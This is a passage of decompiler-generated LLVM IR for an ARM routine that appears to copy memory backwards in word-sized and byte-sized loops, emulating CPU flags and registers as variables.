  %v5_c968 = and i32 %v4_c968, %v2_c95c
  %v6_c968 = icmp slt i32 %v5_c968, 0
  store i1 %v6_c968, i1* %cpsr_v.global-to-local, align 1
  %v7_c968 = icmp slt i32 %v2_c968, 0
  store i1 %v7_c968, i1* %cpsr_n.global-to-local, align 1
  %v5_c96c = icmp slt i32 %v2_c95c, 20
  br i1 %v5_c96c, label %dec_label_pc_c988, label %dec_label_pc_c970

dec_label_pc_c970:                                ; preds = %dec_label_pc_c964, %dec_label_pc_c970.dec_label_pc_c970_crit_edge
  %v0_c974 = phi i32 [ %v1_c97c, %dec_label_pc_c970.dec_label_pc_c970_crit_edge ], [ %v0_c97448, %dec_label_pc_c964 ]
  %v0_c970 = phi i32 [ %v0_c970.pre, %dec_label_pc_c970.dec_label_pc_c970_crit_edge ], [ %v0_c97047, %dec_label_pc_c964 ]
  %v1_c970 = add i32 %v0_c970, -4
  %v2_c970 = inttoptr i32 %v1_c970 to i32*
  %v3_c970 = load i32, i32* %v2_c970, align 4
  store i32 %v3_c970, i32* %r3.global-to-local, align 4
  %v4_c970 = add i32 %v0_c970, -8
  %v5_c970 = inttoptr i32 %v4_c970 to i32*
  %v6_c970 = load i32, i32* %v5_c970, align 4
  store i32 %v6_c970, i32* %r4.global-to-local, align 4
  %v7_c970 = add i32 %v0_c970, -12
  %v8_c970 = inttoptr i32 %v7_c970 to i32*
  %v9_c970 = load i32, i32* %v8_c970, align 4
  store i32 %v9_c970, i32* %ip.global-to-local, align 4
  %v10_c970 = add i32 %v0_c970, -16
  %v11_c970 = inttoptr i32 %v10_c970 to i32*
  %v12_c970 = load i32, i32* %v11_c970, align 4
  store i32 %v12_c970, i32* %lr.global-to-local, align 4
  store i32 %v10_c970, i32* %r1.global-to-local, align 4
  %v1_c974 = add i32 %v0_c974, -16
  %v2_c974 = inttoptr i32 %v1_c974 to i32*
  store i32 %v3_c970, i32* %v2_c974, align 4
  %v4_c974 = add i32 %v0_c974, -12
  %v5_c974 = inttoptr i32 %v4_c974 to i32*
  %v6_c974 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_c974, i32* %v5_c974, align 4
  %v7_c974 = add i32 %v0_c974, -8
  %v8_c974 = inttoptr i32 %v7_c974 to i32*
  %v9_c974 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_c974, i32* %v8_c974, align 4
  %v10_c974 = add i32 %v0_c974, -4
  %v11_c974 = inttoptr i32 %v10_c974 to i32*
  %v12_c974 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_c974, i32* %v11_c974, align 4
  store i32 %v1_c974, i32* %r0.global-to-local, align 4
  %v0_c978 = load i32, i32* %r1.global-to-local, align 4
  %v1_c978 = add i32 %v0_c978, -4
  %v2_c978 = inttoptr i32 %v1_c978 to i32*
  %v3_c978 = load i32, i32* %v2_c978, align 4
  store i32 %v3_c978, i32* %r3.global-to-local, align 4
  %v4_c978 = add i32 %v0_c978, -8
  %v5_c978 = inttoptr i32 %v4_c978 to i32*
  %v6_c978 = load i32, i32* %v5_c978, align 4
  store i32 %v6_c978, i32* %r4.global-to-local, align 4
  %v7_c978 = add i32 %v0_c978, -12
  %v8_c978 = inttoptr i32 %v7_c978 to i32*
  %v9_c978 = load i32, i32* %v8_c978, align 4
  store i32 %v9_c978, i32* @ip, align 4
  %v10_c978 = add i32 %v0_c978, -16
  %v11_c978 = inttoptr i32 %v10_c978 to i32*
  %v12_c978 = load i32, i32* %v11_c978, align 4
  store i32 %v12_c978, i32* %lr.global-to-local, align 4
  store i32 %v10_c978, i32* @r1, align 4
  %v1_c97c = add i32 %v0_c974, -32
  %v2_c97c = inttoptr i32 %v1_c97c to i32*
  store i32 %v3_c978, i32* %v2_c97c, align 4
  %v4_c97c = add i32 %v0_c974, -28
  %v5_c97c = inttoptr i32 %v4_c97c to i32*
  %v6_c97c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_c97c, i32* %v5_c97c, align 4
  %v7_c97c = add i32 %v0_c974, -24
  %v8_c97c = inttoptr i32 %v7_c97c to i32*
  %v9_c97c = load i32, i32* @ip, align 4
  store i32 %v9_c97c, i32* %v8_c97c, align 4
  %v10_c97c = add i32 %v0_c974, -20
  %v11_c97c = inttoptr i32 %v10_c97c to i32*
  %v12_c97c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_c97c, i32* %v11_c97c, align 4
  store i32 %v1_c97c, i32* %r0.global-to-local, align 4
  %v0_c980 = load i32, i32* %r2.global-to-local, align 4
  %v2_c980 = add i32 %v0_c980, -32
  store i32 %v2_c980, i32* %r2.global-to-local, align 4
  %v6_c984 = icmp slt i32 %v0_c980, 32
  br i1 %v6_c984, label %dec_label_pc_c988.loopexit, label %dec_label_pc_c970.dec_label_pc_c970_crit_edge

dec_label_pc_c970.dec_label_pc_c970_crit_edge:    ; preds = %dec_label_pc_c970
  %v0_c970.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c970

dec_label_pc_c988.loopexit:                       ; preds = %dec_label_pc_c970
  %v4_c980 = sub i32 31, %v0_c980
  %v5_c980 = and i32 %v4_c980, %v0_c980
  %v6_c980 = icmp slt i32 %v5_c980, 0
  %v7_c980 = icmp slt i32 %v2_c980, 0
  store i1 %v6_c980, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_c980, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_c988

dec_label_pc_c988:                                ; preds = %dec_label_pc_c988.loopexit, %dec_label_pc_c964
  %v6_c990 = phi i32 [ %v1_c97c, %dec_label_pc_c988.loopexit ], [ %v0_c97448, %dec_label_pc_c964 ]
  %v0_c998.pr = phi i32 [ %v2_c980, %dec_label_pc_c988.loopexit ], [ %v2_c968, %dec_label_pc_c964 ]
  %v4_c988 = add i32 %v0_c998.pr, 16
  %v6_c988 = sub i32 0, %v0_c998.pr
  %v7_c988 = and i32 %v4_c988, %v6_c988
  %v8_c988 = icmp slt i32 %v7_c988, 0
  store i1 %v8_c988, i1* %cpsr_v.global-to-local, align 1
  %v9_c988 = icmp slt i32 %v4_c988, 0
  store i1 %v9_c988, i1* %cpsr_n.global-to-local, align 1
  %v5_c98c = icmp slt i32 %v0_c998.pr, -16
  br i1 %v5_c98c, label %.thread13, label %bb139

bb139:                                            ; preds = %dec_label_pc_c988
  %v6_c98c = load i32, i32* @r1, align 4
  %v7_c98c = add i32 %v6_c98c, -4
  %v8_c98c = inttoptr i32 %v7_c98c to i32*
  %v9_c98c = load i32, i32* %v8_c98c, align 4
  store i32 %v9_c98c, i32* %r3.global-to-local, align 4
  %v10_c98c = add i32 %v6_c98c, -8
  %v11_c98c = inttoptr i32 %v10_c98c to i32*
  %v12_c98c = load i32, i32* %v11_c98c, align 4
  store i32 %v12_c98c, i32* %r4.global-to-local, align 4
  %v13_c98c = add i32 %v6_c98c, -12
  %v14_c98c = inttoptr i32 %v13_c98c to i32*
  %v15_c98c = load i32, i32* %v14_c98c, align 4
  store i32 %v15_c98c, i32* @ip, align 4
  %v16_c98c = add i32 %v6_c98c, -16
  %v17_c98c = inttoptr i32 %v16_c98c to i32*
  %v18_c98c = load i32, i32* %v17_c98c, align 4
  store i32 %v18_c98c, i32* %lr.global-to-local, align 4
  store i32 %v16_c98c, i32* @r1, align 4
  %v7_c990 = add i32 %v6_c990, -16
  %v8_c990 = inttoptr i32 %v7_c990 to i32*
  store i32 %v9_c98c, i32* %v8_c990, align 4
  %v10_c990 = add i32 %v6_c990, -12
  %v11_c990 = inttoptr i32 %v10_c990 to i32*
  %v12_c990 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_c990, i32* %v11_c990, align 4
  %v13_c990 = add i32 %v6_c990, -8
  %v14_c990 = inttoptr i32 %v13_c990 to i32*
  %v15_c990 = load i32, i32* @ip, align 4
  store i32 %v15_c990, i32* %v14_c990, align 4
  %v16_c990 = add i32 %v6_c990, -4
  %v17_c990 = inttoptr i32 %v16_c990 to i32*
  %v18_c990 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_c990, i32* %v17_c990, align 4
  store i32 %v7_c990, i32* %r0.global-to-local, align 4
  %v6_c994 = load i32, i32* %r2.global-to-local, align 4
  %v7_c994 = add i32 %v6_c994, -16
  store i32 %v7_c994, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_c988, %bb139
  %v6_c9a0 = phi i32 [ %v7_c990, %bb139 ], [ %v6_c990, %dec_label_pc_c988 ]
  %v0_c998 = phi i32 [ %v7_c994, %bb139 ], [ %v0_c998.pr, %dec_label_pc_c988 ]
  %v4_c998 = add i32 %v0_c998, 20
  store i32 %v4_c998, i32* %r2.global-to-local, align 4
  %v6_c998 = sub i32 0, %v0_c998
  %v7_c998 = and i32 %v4_c998, %v6_c998
  %v8_c998 = icmp slt i32 %v7_c998, 0
  store i1 %v8_c998, i1* %cpsr_v.global-to-local, align 1
  %v9_c998 = icmp slt i32 %v4_c998, 0
  store i1 %v9_c998, i1* %cpsr_n.global-to-local, align 1
  %v5_c99c = icmp slt i32 %v0_c998, -20
  br i1 %v5_c99c, label %.thread15, label %bb140

bb140:                                            ; preds = %.thread13
  %v6_c99c = load i32, i32* @r1, align 4
  %v7_c99c = add i32 %v6_c99c, -4
  %v8_c99c = inttoptr i32 %v7_c99c to i32*
  %v9_c99c = load i32, i32* %v8_c99c, align 4
  store i32 %v9_c99c, i32* %r3.global-to-local, align 4
  %v10_c99c = add i32 %v6_c99c, -8
  %v11_c99c = inttoptr i32 %v10_c99c to i32*
  %v12_c99c = load i32, i32* %v11_c99c, align 4
  store i32 %v12_c99c, i32* @ip, align 4
  %v13_c99c = add i32 %v6_c99c, -12
  %v14_c99c = inttoptr i32 %v13_c99c to i32*
  %v15_c99c = load i32, i32* %v14_c99c, align 4
  store i32 %v15_c99c, i32* %lr.global-to-local, align 4
  store i32 %v13_c99c, i32* @r1, align 4
  %v7_c9a0 = add i32 %v6_c9a0, -12
  %v8_c9a0 = inttoptr i32 %v7_c9a0 to i32*
  store i32 %v9_c99c, i32* %v8_c9a0, align 4
  %v10_c9a0 = add i32 %v6_c9a0, -8
  %v11_c9a0 = inttoptr i32 %v10_c9a0 to i32*
  %v12_c9a0 = load i32, i32* @ip, align 4
  store i32 %v12_c9a0, i32* %v11_c9a0, align 4
  %v13_c9a0 = add i32 %v6_c9a0, -4
  %v14_c9a0 = inttoptr i32 %v13_c9a0 to i32*
  %v15_c9a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_c9a0, i32* %v14_c9a0, align 4
  store i32 %v7_c9a0, i32* %r0.global-to-local, align 4
  %v6_c9a4 = load i32, i32* %r2.global-to-local, align 4
  %v7_c9a4 = add i32 %v6_c9a4, -12
  store i32 %v7_c9a4, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb140
  %v6_c9c456 = phi i32 [ %v6_c9a0, %.thread13 ], [ %v7_c9a0, %bb140 ]
  %v0_c9ac54 = phi i32 [ %v4_c998, %.thread13 ], [ %v7_c9a4, %bb140 ]
  %v2_c9a8 = load i8*, i8** %stack_var_-8, align 4
  %v3_c9a8 = ptrtoint i8* %v2_c9a8 to i32
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v8_c964, i32* @lr, align 4
  br label %dec_label_pc_c9ac

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c95c, %.thread15
  %v7_c9bc = phi i32 [ %v0_c97448, %dec_label_pc_c95c ], [ %v6_c9c456, %.thread15 ]
  %v0_c9ac = phi i32 [ %v2_c95c, %dec_label_pc_c95c ], [ %v0_c9ac54, %.thread15 ]
  %v2_c9ac = add i32 %v0_c9ac, 8
  store i32 %v2_c9ac, i32* %r2.global-to-local, align 4
  %v4_c9ac = sub i32 0, %v0_c9ac
  %v5_c9ac = and i32 %v2_c9ac, %v4_c9ac
  %v6_c9ac = icmp slt i32 %v5_c9ac, 0
  store i1 %v6_c9ac, i1* %cpsr_v.global-to-local, align 1
  %v7_c9ac = icmp slt i32 %v2_c9ac, 0
  store i1 %v7_c9ac, i1* %cpsr_n.global-to-local, align 1
  %v5_c9b0 = icmp slt i32 %v0_c9ac, -8
  br i1 %v5_c9b0, label %bb142, label %dec_label_pc_c9b4

dec_label_pc_c9b4:                                ; preds = %dec_label_pc_c9ac
  %v6_c9b4 = add i32 %v0_c9ac, 4
  store i32 %v6_c9b4, i32* %r2.global-to-local, align 4
  %v8_c9b4 = sub i32 -5, %v0_c9ac
  %v9_c9b4 = and i32 %v8_c9b4, %v2_c9ac
  %v10_c9b4 = icmp slt i32 %v9_c9b4, 0
  store i1 %v10_c9b4, i1* %cpsr_v.global-to-local, align 1
  %v11_c9b4 = icmp slt i32 %v6_c9b4, 0
  store i1 %v11_c9b4, i1* %cpsr_n.global-to-local, align 1
  %v5_c9b8 = icmp slt i32 %v2_c9ac, 4
  %v6_c9b8 = load i32, i32* @r1, align 4
  %v7_c9b8 = add i32 %v6_c9b8, -4
  %v8_c9b8 = inttoptr i32 %v7_c9b8 to i32*
  %v9_c9b8 = load i32, i32* %v8_c9b8, align 4
  store i32 %v9_c9b8, i32* %r3.global-to-local, align 4
  br i1 %v5_c9b8, label %.thread19, label %bb141

.thread19:                                        ; preds = %dec_label_pc_c9b4
  store i32 %v7_c9b8, i32* @r1, align 4
  %v8_c9bc = add i32 %v7_c9bc, -4
  %v9_c9bc = inttoptr i32 %v8_c9bc to i32*
  store i32 %v9_c9b8, i32* %v9_c9bc, align 4
  %v10_c9bc = load i32, i32* %r0.global-to-local, align 4
  %v11_c9bc = add i32 %v10_c9bc, -4
  store i32 %v11_c9bc, i32* %r0.global-to-local, align 4
  %v0_c9cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb142

bb141:                                            ; preds = %dec_label_pc_c9b4
  %v10_c9c0 = add i32 %v6_c9b8, -8
  %v11_c9c0 = inttoptr i32 %v10_c9c0 to i32*
  %v12_c9c0 = load i32, i32* %v11_c9c0, align 4
  store i32 %v12_c9c0, i32* @ip, align 4
  store i32 %v10_c9c0, i32* @r1, align 4
  %v7_c9c4 = add i32 %v7_c9bc, -8
  %v8_c9c4 = inttoptr i32 %v7_c9c4 to i32*
  store i32 %v9_c9b8, i32* %v8_c9c4, align 4
  %v10_c9c4 = add i32 %v7_c9bc, -4
  %v11_c9c4 = inttoptr i32 %v10_c9c4 to i32*
  %v12_c9c4 = load i32, i32* @ip, align 4
  store i32 %v12_c9c4, i32* %v11_c9c4, align 4
  store i32 %v7_c9c4, i32* %r0.global-to-local, align 4
  %v6_c9c8 = load i32, i32* %r2.global-to-local, align 4
  %v7_c9c8 = add i32 %v6_c9c8, -4
  store i32 %v7_c9c8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %.thread19, %dec_label_pc_c9ac, %dec_label_pc_c93c, %.thread25, %dec_label_pc_cb70, %dec_label_pc_cb04, %dec_label_pc_ca98, %bb141
  %v2_c9d0 = phi i32 [ %v11_c9bc, %.thread19 ], [ %v7_c9bc, %dec_label_pc_c9ac ], [ %v2_c940, %dec_label_pc_c93c ], [ %v0_ca6831, %.thread25 ], [ %v2_c9dc64, %dec_label_pc_cb70 ], [ %v2_c9dc63, %dec_label_pc_cb04 ], [ %v2_c9dc62, %dec_label_pc_ca98 ], [ %v7_c9c4, %bb141 ]
  %v0_c9cc = phi i32 [ %v0_c9cc.pre, %.thread19 ], [ %v2_c9ac, %dec_label_pc_c9ac ], [ %v2_c944, %dec_label_pc_c93c ], [ %v2_ca10, %.thread25 ], [ %v0_c9cc60, %dec_label_pc_cb70 ], [ %v0_c9cc59, %dec_label_pc_cb04 ], [ %v0_c9cc58, %dec_label_pc_ca98 ], [ %v7_c9c8, %bb141 ]
  %v1_c9cc = add i32 %v0_c9cc, 4
  store i32 %v1_c9cc, i32* @r2, align 4
  %v3_c9cc = sub i32 0, %v0_c9cc
  %v4_c9cc = and i32 %v1_c9cc, %v3_c9cc
  %v5_c9cc = icmp slt i32 %v4_c9cc, 0
  store i1 %v5_c9cc, i1* %cpsr_v.global-to-local, align 1
  %v6_c9cc = icmp slt i32 %v1_c9cc, 0
  store i1 %v6_c9cc, i1* %cpsr_n.global-to-local, align 1
  %v7_c9cc = icmp eq i32 %v1_c9cc, 0
  store i1 %v7_c9cc, i1* @cpsr_z, align 1
  br i1 %v7_c9cc, label %.thread122, label %bb143

bb143:                                            ; preds = %bb142
  %v1_c9d4 = add i32 %v0_c9cc, 2
  %v3_c9d4 = sub i32 -3, %v0_c9cc
  %v4_c9d4 = and i32 %v3_c9d4, %v1_c9cc
  %v5_c9d4 = icmp slt i32 %v4_c9d4, 0
  store i1 %v5_c9d4, i1* %cpsr_v.global-to-local, align 1
  %v6_c9d4 = icmp slt i32 %v1_c9d4, 0
  store i1 %v6_c9d4, i1* %cpsr_n.global-to-local, align 1
  %v7_c9d4 = icmp eq i32 %v1_c9cc, 2
  store i1 %v7_c9d4, i1* @cpsr_z, align 1
  %v0_c9d8 = load i32, i32* @r1, align 4
  %v1_c9d8 = add i32 %v0_c9d8, -1
  %v2_c9d8 = inttoptr i32 %v1_c9d8 to i8*
  %v3_c9d8 = load i8, i8* %v2_c9d8, align 1
  %v4_c9d8 = zext i8 %v3_c9d8 to i32
  store i32 %v4_c9d8, i32* %r3.global-to-local, align 4
  store i32 %v1_c9d8, i32* @r1, align 4
  %v3_c9dc = add i32 %v2_c9d0, -1
  %v4_c9dc = inttoptr i32 %v3_c9dc to i8*
  store i8 %v3_c9d8, i8* %v4_c9dc, align 1
  %v5_c9dc = load i32, i32* %r0.global-to-local, align 4
  %v6_c9dc = add i32 %v5_c9dc, -1
  store i32 %v6_c9dc, i32* %r0.global-to-local, align 4
  %v0_c9e0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_c9e0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_c9e0 = xor i1 %v0_c9e0, %v1_c9e0
  br i1 %v2_c9e0, label %.thread121, label %bb144

bb144:                                            ; preds = %bb143
  %v3_c9e0 = load i32, i32* @r1, align 4
  %v4_c9e0 = add i32 %v3_c9e0, -1
  %v5_c9e0 = inttoptr i32 %v4_c9e0 to i8*
  %v6_c9e0 = load i8, i8* %v5_c9e0, align 1
  %v7_c9e0 = zext i8 %v6_c9e0 to i32
  store i32 %v7_c9e0, i32* %r3.global-to-local, align 4
  store i32 %v4_c9e0, i32* @r1, align 4
  %v6_c9e4 = add i32 %v5_c9dc, -2
  %v7_c9e4 = inttoptr i32 %v6_c9e4 to i8*
  store i8 %v6_c9e0, i8* %v7_c9e4, align 1
  %v8_c9e4 = load i32, i32* %r0.global-to-local, align 4
  %v9_c9e4 = add i32 %v8_c9e4, -1
  store i32 %v9_c9e4, i32* %r0.global-to-local, align 4
  %v1_c9e8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_c9e8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb143, %bb144
  %v7_c9ec = phi i32 [ %v9_c9e4, %bb144 ], [ %v6_c9dc, %bb143 ]
  %v2_c9ec = phi i1 [ %v2_c9e8.pre, %bb144 ], [ %v1_c9e0, %bb143 ]
  %v1_c9ec = phi i1 [ %v1_c9e8.pre, %bb144 ], [ %v0_c9e0, %bb143 ]
  %v0_c9e8 = load i1, i1* @cpsr_z, align 1
  %v3_c9e8 = xor i1 %v2_c9ec, %v1_c9ec
  %v4_c9e8 = or i1 %v0_c9e8, %v3_c9e8
  br i1 %v4_c9e8, label %.thread122, label %bb145

bb145:                                            ; preds = %.thread121
  %v5_c9e8 = load i32, i32* @r1, align 4
  %v6_c9e8 = add i32 %v5_c9e8, -1
  %v7_c9e8 = inttoptr i32 %v6_c9e8 to i8*
  %v8_c9e8 = load i8, i8* %v7_c9e8, align 1
  %v9_c9e8 = zext i8 %v8_c9e8 to i32
  store i32 %v9_c9e8, i32* %r3.global-to-local, align 4
  store i32 %v6_c9e8, i32* @r1, align 4
  %v8_c9ec = add i32 %v7_c9ec, -1
  %v9_c9ec = inttoptr i32 %v8_c9ec to i8*
  store i8 %v8_c9e8, i8* %v9_c9ec, align 1
  %v10_c9ec = load i32, i32* %r0.global-to-local, align 4
  %v11_c9ec = add i32 %v10_c9ec, -1
  store i32 %v11_c9ec, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c94c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_c9f4 = icmp eq i32 %v1_c94c, 1
  store i1 %v8_c9f4, i1* %cpsr_n.global-to-local, align 1
  %v1_c9f8 = add i32 %v2_c93c, -1
  %v2_c9f8 = inttoptr i32 %v1_c9f8 to i8*
  %v3_c9f8 = load i8, i8* %v2_c9f8, align 1
  %v4_c9f8 = zext i8 %v3_c9f8 to i32
  store i32 %v4_c9f8, i32* %r3.global-to-local, align 4
  store i32 %v1_c9f8, i32* @r1, align 4
  %v3_c9fc = add i32 %v2_c940, -1
  %v4_c9fc = inttoptr i32 %v3_c9fc to i8*
  store i8 %v3_c9f8, i8* %v4_c9fc, align 1
  %v5_c9fc = load i32, i32* %r0.global-to-local, align 4
  %v6_c9fc = add i32 %v5_c9fc, -1
  store i32 %v6_c9fc, i32* %r0.global-to-local, align 4
  br i1 %v8_c9f4, label %.thread25, label %bb146

bb146:                                            ; preds = %dec_label_pc_c9f4
  %v9_c9f4 = icmp eq i32 %v1_c94c, 2
  %v6_ca00 = load i32, i32* @r1, align 4
  %v7_ca00 = add i32 %v6_ca00, -1
  %v8_ca00 = inttoptr i32 %v7_ca00 to i8*
  %v9_ca00 = load i8, i8* %v8_ca00, align 1
  %v10_ca00 = zext i8 %v9_ca00 to i32
  store i32 %v10_ca00, i32* %r3.global-to-local, align 4
  store i32 %v7_ca00, i32* @r1, align 4
  %v9_ca04 = add i32 %v5_c9fc, -2
  %v10_ca04 = inttoptr i32 %v9_ca04 to i8*
  store i8 %v9_ca00, i8* %v10_ca04, align 1
  %v11_ca04 = load i32, i32* %r0.global-to-local, align 4
  %v12_ca04 = add i32 %v11_ca04, -1
  store i32 %v12_ca04, i32* %r0.global-to-local, align 4
  br i1 %v9_c9f4, label %.thread25, label %bb147

bb147:                                            ; preds = %bb146
  %v8_ca08 = load i32, i32* @r1, align 4
  %v9_ca08 = add i32 %v8_ca08, -1
  %v10_ca08 = inttoptr i32 %v9_ca08 to i8*
  %v11_ca08 = load i8, i8* %v10_ca08, align 1
  %v12_ca08 = zext i8 %v11_ca08 to i32
  store i32 %v12_ca08, i32* %r3.global-to-local, align 4
  store i32 %v9_ca08, i32* @r1, align 4
  %v11_ca0c = add i32 %v11_ca04, -2
  %v12_ca0c = inttoptr i32 %v11_ca0c to i8*
  store i8 %v11_ca08, i8* %v12_ca0c, align 1
  %v13_ca0c = load i32, i32* %r0.global-to-local, align 4
  %v14_ca0c = add i32 %v13_ca0c, -1
  store i32 %v14_ca0c, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb146, %dec_label_pc_c9f4, %bb147
  %v0_ca6831 = phi i32 [ %v12_ca04, %bb146 ], [ %v6_c9fc, %dec_label_pc_c9f4 ], [ %v14_ca0c, %bb147 ]
  %v0_ca10 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca10 = load i32, i32* @ip, align 4
  %v2_ca10 = sub i32 %v0_ca10, %v1_ca10
  store i32 %v2_ca10, i32* %r2.global-to-local, align 4
  %v4_ca10 = xor i32 %v1_ca10, %v0_ca10
  %v5_ca10 = xor i32 %v2_ca10, %v0_ca10
  %v6_ca10 = and i32 %v5_ca10, %v4_ca10
  %v7_ca10 = icmp slt i32 %v6_ca10, 0
  store i1 %v7_ca10, i1* %cpsr_v.global-to-local, align 1
  %v8_ca10 = icmp slt i32 %v2_ca10, 0
  store i1 %v8_ca10, i1* %cpsr_n.global-to-local, align 1
  %v5_ca14 = icmp slt i32 %v0_ca10, %v1_ca10
  br i1 %v5_ca14, label %bb142, label %dec_label_pc_ca18

dec_label_pc_ca18:                                ; preds = %.thread25
  %v0_ca18 = load i32, i32* @r1, align 4
  %v1_ca18 = urem i32 %v0_ca18, 4
  store i32 %v1_ca18, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_ca18 = icmp eq i32 %v1_ca18, 0
  br i1 %v2_ca18, label %dec_label_pc_c95c, label %dec_label_pc_ca20

dec_label_pc_ca20:                                ; preds = %dec_label_pc_c954, %dec_label_pc_ca18
  %v0_ca6830 = phi i32 [ %v2_c940, %dec_label_pc_c954 ], [ %v0_ca6831, %dec_label_pc_ca18 ]
  %v0_cb14 = phi i32 [ %v2_c944, %dec_label_pc_c954 ], [ %v2_ca10, %dec_label_pc_ca18 ]
  %v0_ca20 = phi i32 [ %v2_c93c, %dec_label_pc_c954 ], [ %v0_ca18, %dec_label_pc_ca18 ]
  %v0_ca28 = phi i32 [ %v1_c954, %dec_label_pc_c954 ], [ %v1_ca18, %dec_label_pc_ca18 ]
  %v1_ca20 = and i32 %v0_ca20, -4
  store i32 %v1_ca20, i32* %r1.global-to-local, align 4
  %v1_ca24 = inttoptr i32 %v1_ca20 to i32*
  %v2_ca24 = load i32, i32* %v1_ca24, align 4
  store i32 %v2_ca24, i32* %r3.global-to-local, align 4
  %v7_ca28 = icmp ult i32 %v0_ca28, 2
  %v2_cb0c = add i32 %v0_cb14, -12
  %v4_cb0c = sub i32 11, %v0_cb14
  %v5_cb0c = and i32 %v4_cb0c, %v0_cb14
  %v6_cb0c = icmp slt i32 %v5_cb0c, 0
  store i1 %v6_cb0c, i1* %cpsr_v.global-to-local, align 1
  %v7_cb0c = icmp slt i32 %v2_cb0c, 0
  store i1 %v7_cb0c, i1* %cpsr_n.global-to-local, align 1
  %v5_cb10 = icmp slt i32 %v0_cb14, 12
  br i1 %v7_ca28, label %dec_label_pc_cb0c, label %dec_label_pc_ca30

dec_label_pc_ca30:                                ; preds = %dec_label_pc_ca20
  %v8_ca28 = icmp eq i32 %v0_ca28, 2
  br i1 %v8_ca28, label %dec_label_pc_caa0, label %dec_label_pc_ca34

dec_label_pc_ca34:                                ; preds = %dec_label_pc_ca30
  br i1 %v5_cb10, label %dec_label_pc_ca80, label %dec_label_pc_ca3c

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_ca34
  store i32 %v2_cb0c, i32* %r2.global-to-local, align 4
  %v3_ca40 = load i32, i32* @r4, align 4
  store i32 %v3_ca40, i32* %stack_var_-12, align 4
  %v6_ca40 = load i32, i32* @r5, align 4
  %v8_ca40 = inttoptr i32 %v6_ca40 to i8*
  store i8* %v8_ca40, i8** %stack_var_-8, align 4
  %v11_ca40 = load i32, i32* @lr, align 4
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca44.dec_label_pc_ca44_crit_edge, %dec_label_pc_ca3c
  %v0_ca68 = phi i32 [ %v1_ca68, %dec_label_pc_ca44.dec_label_pc_ca44_crit_edge ], [ %v0_ca6830, %dec_label_pc_ca3c ]
  %v0_ca48 = phi i32 [ %v0_ca48.pre, %dec_label_pc_ca44.dec_label_pc_ca44_crit_edge ], [ %v1_ca20, %dec_label_pc_ca3c ]
  %v0_ca44 = phi i32 [ %v0_ca44.pre, %dec_label_pc_ca44.dec_label_pc_ca44_crit_edge ], [ %v2_ca24, %dec_label_pc_ca3c ]
  %v3_ca44 = mul i32 %v0_ca44, 256
  store i32 %v3_ca44, i32* %lr.global-to-local, align 4
  %v1_ca48 = add i32 %v0_ca48, -4
  %v2_ca48 = inttoptr i32 %v1_ca48 to i32*
  %v3_ca48 = load i32, i32* %v2_ca48, align 4
  store i32 %v3_ca48, i32* %r3.global-to-local, align 4
  %v4_ca48 = add i32 %v0_ca48, -8
  %v5_ca48 = inttoptr i32 %v4_ca48 to i32*
  %v6_ca48 = load i32, i32* %v5_ca48, align 4
  store i32 %v6_ca48, i32* %r4.global-to-local, align 4
  %v7_ca48 = add i32 %v0_ca48, -12
  %v8_ca48 = inttoptr i32 %v7_ca48 to i32*
  %v9_ca48 = load i32, i32* %v8_ca48, align 4
  store i32 %v9_ca48, i32* %r5.global-to-local, align 4
  %v10_ca48 = add i32 %v0_ca48, -16
  %v11_ca48 = inttoptr i32 %v10_ca48 to i32*
  %v12_ca48 = load i32, i32* %v11_ca48, align 4
  store i32 %v10_ca48, i32* %r1.global-to-local, align 4
  %v4_ca4c = udiv i32 %v12_ca48, 16777216
  %v5_ca4c = or i32 %v4_ca4c, %v3_ca44
  store i32 %v5_ca4c, i32* %lr.global-to-local, align 4
  %v3_ca50 = mul i32 %v12_ca48, 256
  %v4_ca54 = udiv i32 %v9_ca48, 16777216
  %v5_ca54 = or i32 %v3_ca50, %v4_ca54
  store i32 %v5_ca54, i32* @ip, align 4
  %v3_ca58 = mul i32 %v9_ca48, 256
  %v4_ca5c = udiv i32 %v6_ca48, 16777216
  %v5_ca5c = or i32 %v3_ca58, %v4_ca5c
  store i32 %v5_ca5c, i32* %r5.global-to-local, align 4
  %v3_ca60 = mul i32 %v6_ca48, 256
  %v4_ca64 = udiv i32 %v3_ca48, 16777216
  %v5_ca64 = or i32 %v3_ca60, %v4_ca64
  store i32 %v5_ca64, i32* %r4.global-to-local, align 4
  %v1_ca68 = add i32 %v0_ca68, -16
  %v2_ca68 = inttoptr i32 %v1_ca68 to i32*
  store i32 %v5_ca64, i32* %v2_ca68, align 4
  %v4_ca68 = add i32 %v0_ca68, -12
  %v5_ca68 = inttoptr i32 %v4_ca68 to i32*
  %v6_ca68 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_ca68, i32* %v5_ca68, align 4
  %v7_ca68 = add i32 %v0_ca68, -8
